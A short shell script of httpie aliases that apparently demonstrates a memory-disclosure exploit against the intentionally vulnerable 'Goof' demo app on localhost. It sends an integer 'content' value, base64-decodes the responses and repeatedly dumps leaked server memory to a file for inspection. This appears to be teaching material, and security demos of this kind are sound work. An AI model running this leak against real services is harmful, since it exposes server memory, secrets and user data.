### Note: these exploits use the httpie command line utility

if [ -z "$GOOF_HOST" ]; then 
	export GOOF_HOST=http://localhost:3001
fi
 
# start
alias mon1="http $GOOF_HOST/ --headers"

# Works as advertised
alias mon2="echo 'content=Buy Beer' | http --form $GOOF_HOST/create -v"

# Works with json
alias mon3="echo '{\"content\":\"Fix the bike\"}' | http --json $GOOF_HOST/create -v"

# Works with number string
alias mon4="echo '{\"content\":\"800\"}' | http --json $GOOF_HOST/create -v"

# Exploit start - integer
alias mon5="echo '{\"content\":800}' | http --json $GOOF_HOST/create -v"

# Switch to only showing the response body
alias mon6="echo '{\"content\":800}' | http --json $GOOF_HOST/create -b | base64 -D"

# Repeatedly extract memory
# window 1
alias mon_repeat1="repeat 1000 echo '{\"content\":800}' | http --json $GOOF_HOST/create -b | base64 -D >> leakedmem.bin"

# window 2 - see strings in the response
alias mon_repeat2="tail -f leakedmem.bin | strings"

# window 3 - see a memory dum in the response
alias mon_repeat3="tail -f leakedmem.bin | xxd -c 32 -g 32"
